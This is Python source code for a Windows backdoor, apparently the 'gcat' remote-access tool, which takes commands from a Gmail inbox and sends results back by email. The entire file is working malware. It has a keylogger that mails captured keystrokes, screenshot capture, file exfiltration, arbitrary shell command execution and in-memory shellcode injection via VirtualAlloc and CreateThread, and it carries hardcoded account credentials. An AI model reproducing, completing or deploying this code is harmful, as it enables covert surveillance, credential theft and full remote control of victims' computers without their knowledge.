import subprocess
import sys
import os
import base64
import binascii
import threading
import time
import random
import string
import imaplib
import email
import uuid
import platform
import ctypes
import ast
import win32process
import win32api
import win32con
import win32gui
import logging
import pythoncom
import pyHook
import win32security

from PIL import ImageGrab
from traceback import print_exc
from ntsecuritycon import *
from win32com.shell import shell
from smtplib import SMTP
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders

#######################################
gmail_user = 'gcat.test.mofo@gmail.com'
gmail_pwd = 'prettyflypassword'
server = "smtp.gmail.com"
server_port = 587
#######################################

#Prints error messages and info to stdout
verbose = True
log_level = 20 

if verbose is True:
    log_level = 10

logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

#generates a unique uuid 
uniqueid = str(uuid.uuid5(uuid.NAMESPACE_OID, os.environ['USERNAME']))

class msgparser:

    def __init__(self, msg_data):
        self.attachment = None
        self.getPayloads(msg_data)
        self.getSubjectHeader(msg_data)
        self.getDateHeader(msg_data)

    def getPayloads(self, msg_data):
        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
            if payload.get_content_maintype() == 'text':
                self.text = payload.get_payload()
                self.dict = ast.literal_eval(payload.get_payload())

            elif payload.get_content_maintype() == 'application':
                self.attachment = payload.get_payload()

    def getSubjectHeader(self, msg_data):
        self.subject = email.message_from_string(msg_data[1][0][1])['Subject']

    def getDateHeader(self, msg_data):
        self.date = email.message_from_string(msg_data[1][0][1])['Date']

class keylogger(threading.Thread):

    _instance = None

    def __init__(self, jobid):

        threading.Thread.__init__(self)
        self.jobid = jobid
        self.getkeys = True
        self.key_buffer = ''

        self.setDaemon(True)

    @staticmethod
    def getInstance(jobid):
        if keylogger._instance is None:
            keylogger._instance = keylogger(jobid)

        return keylogger._instance

    def run(self):
        logging.debug("[keylogger] started with jobid: {}".format(self.jobid))

        while self.getkeys:
            hm = pyHook.HookManager() 
            hm.KeyDown = self.onKeyboardEvent 
            hm.HookKeyboard() 
            pythoncom.PumpMessages()

    def stop(self):
        logging.debug("[keylogger] stopped with jobid: {}".format(self.jobid))

        self.getkeys = False
        self._instance = None
        self.join()

    def onKeyboardEvent(self, event):
        char = chr(event.Ascii)
        if event.Ascii != 0 or 8:
            logging.debug("[keylogger] key: {} key_buffer: {}".format(char, len(self.key_buffer)))
            self.key_buffer += char
        
        if event.Ascii == 13:
            logging.debug("[keylogger] key: {} key_buffer: {}".format(char, len(self.key_buffer)))
            self.key_buffer += char

        if len(self.key_buffer) is 100:
            logging.debug("[keylogger] Resetting key_buffer")
            sendEmail({'CMD': 'keylogger', 'RES': self.key_buffer}, jobid=self.jobid)
            self.key_buffer = ''



def genRandomString(slen=10):
    return ''.join(random.sample(string.ascii_letters + string.digits, slen))

def isAdmin():
    return shell.IsUserAnAdmin()

def getSysinfo():
    return '{}-{}'.format(platform.platform(), os.environ['PROCESSOR_ARCHITECTURE'])

def detectForgroundWindow():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def lockWorkstation(jobid):
    try:
        ctypes.windll.user32.LockWorkStation()
        sendEmail({'CMD': 'lockscreen', 'RES': 'Success'}, jobid=jobid)
    except Exception as e:
        if verbose == True: print print_exc()

def download(file, jobid):
    if os.path.exists(file) == True:
        try:
            SendEmail('Downloaded file ' + str(file), file)
        except Exception, e:
            if verbose == True: print print_exc()
            SendEmail('Download Failed: ' + str(e))
            pass

def upload(file, jobid):
    raise NotImplementedError

def screenshot(jobid):
    try:

        screen_dir = os.getenv('TEMP')

        img=ImageGrab.grab()
        saveas= os.path.join(screen_dir, genRandomString() + '.png')
        img.save(saveas)
        sendEmail({'CMD': 'screenshot', 'RES': 'Screenshot taken'}, jobid=jobid, attachment=[saveas])
        os.remove(saveas)

    except Exception as e:
        if verbose == True: print_exc()
        pass

def execShellcode(shellc):
    try:
        shellcode = bytearray(shellc)

        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
                                                  ctypes.c_int(len(shellcode)), 
                                                  ctypes.c_int(0x3000), 
                                                  ctypes.c_int(0x40))
    
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), 
                                             buf, 
                                             ctypes.c_int(len(shellcode))) 
        
        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(ptr),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.pointer(ctypes.c_int(0)))
        
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

    except Exception as e:
        if verbose == True: print_exc()
        

def execCmd(command, jobid):
    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read()
        stdout_value += proc.stderr.read()

        sendEmail({'CMD': command, 'RES': stdout_value}, jobid=jobid)
    except Exception as e:
        if verbose == True: print_exc()
        pass

class sendEmail(threading.Thread):

    def __init__(self, text, jobid='', attachment=[], checkin=False):
        
        threading.Thread.__init__(self)
        self.text = text
        self.jobid = jobid
        self.attachment = attachment
        self.checkin = checkin
        
        self.setDaemon(True)
        self.start()

    def run(self):
        sub_header = uniqueid
        if self.jobid:
            sub_header = 'imp:{}:{}'.format(uniqueid, self.jobid)
        elif self.checkin:
            sub_header = 'checkin:{}'.format(uniqueid)

        msg = MIMEMultipart()
        msg['From'] = sub_header
        msg['To'] = gmail_user
        msg['Subject'] = sub_header

        message_content = {'FGWINDOW': detectForgroundWindow(), 'SYS': getSysinfo(), 'ADMIN': isAdmin(), 'MSG': self.text}
        msg.attach(MIMEText(str(message_content)))

        for attach in self.attachment:
            if os.path.exists(attach) == True:  
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(open(attach, 'rb').read())
                Encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                msg.attach(part)

        while True:
            try:
                mailServer = SMTP()
                mailServer.connect(server, server_port)
                mailServer.starttls()
                mailServer.login(gmail_user,gmail_pwd)
                mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
                mailServer.quit()
                break
            except Exception as e:
                if verbose == True: print_exc()
                time.sleep(10)

def checkJobs():
    #Here we check the inbox for queued jobs, parse them and start a thread

    while True:

        try:
            c = imaplib.IMAP4_SSL(server)
            c.login(gmail_user, gmail_pwd)
            c.select("INBOX")

            typ, id_list_single = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:{}')".format(uniqueid))
            typ, id_list_all = c.uid('search', None, "(UNSEEN SUBJECT 'gcat:ALL')")

            for id_list in [id_list_single, id_list_all]:

                for msg_id in id_list[0].split():

                    msg_data = c.uid('fetch', msg_id, '(RFC822)')
                    msg = msgparser(msg_data)
                    jobid = msg.subject.split(':')[2]
                    
                    if msg.dict:
                        t = None
                        cmd = msg.dict['CMD'].lower()
                        arg = msg.dict['ARG']

                        logging.debug("[checkJobs] CMD: {} JOBID: {}".format(cmd, jobid))

                        if cmd == 'execshellcode':
                            t = threading.Thread(name='execshell', target=execShellcode, args=(arg,jobid))
                        
                        elif cmd == 'download':
                            t = threading.Thread(name='download', target=download, args=(arg,jobid))
                        
                        elif cmd == 'screenshot':
                            t = threading.Thread(name='screenshot', target=screenshot, args=(jobid,))
                        
                        elif cmd == 'cmd':
                            t = threading.Thread(name='execCmd', target=execCmd, args=(arg,jobid,))

                        elif cmd == 'lockscreen':
                            t = threading.Thread(name='lockWorkstation', target=lockWorkstation, args=(jobid,))

                        elif cmd == 'startkeylogger':
                            keylogger.getInstance(jobid).start()

                        elif cmd == 'stopkeylogger':
                            keylogger.getInstance(jobid).stop()

                        elif cmd == 'forcecheckin':
                            sendEmail("Host checking in as requested", checkin=True)

                        else:
                            raise NotImplementedError

                        if t:
                            t.setDaemon(True)
                            t.start()

            c.logout()

            time.sleep(10)
        
        except Exception as e:
            logging.debug(print_exc())
            time.sleep(10)

if __name__ == '__main__':
    sendEmail("Host checking in", checkin=True)
    try:
        checkJobs()
    except KeyboardInterrupt:
        pass
